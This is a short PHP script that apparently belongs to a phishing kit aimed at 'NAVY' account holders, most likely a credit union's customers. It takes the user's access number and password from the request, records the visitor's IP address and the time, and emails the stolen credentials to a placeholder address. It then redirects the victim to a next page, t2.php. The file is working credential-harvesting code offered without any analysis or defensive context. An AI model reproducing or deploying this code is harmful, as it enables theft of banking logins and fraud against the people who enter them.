<?php
$user = $_GET['user'];
$pass = $_GET['pass'];
$ip = getenv("REMOTE_ADDR");
$datamasii=date("D M d, Y g:i a");
$jkr = "------NAVY--------
USER (Access Number) : $user
Pass : $pass
----NAVY--------
";

$recipient = "your@mail.com";
$subject = "$ip";
mail($recipient,$subject,$jkr);
mail($to,$subject,$jkr);
header("Location: t2.php");
?>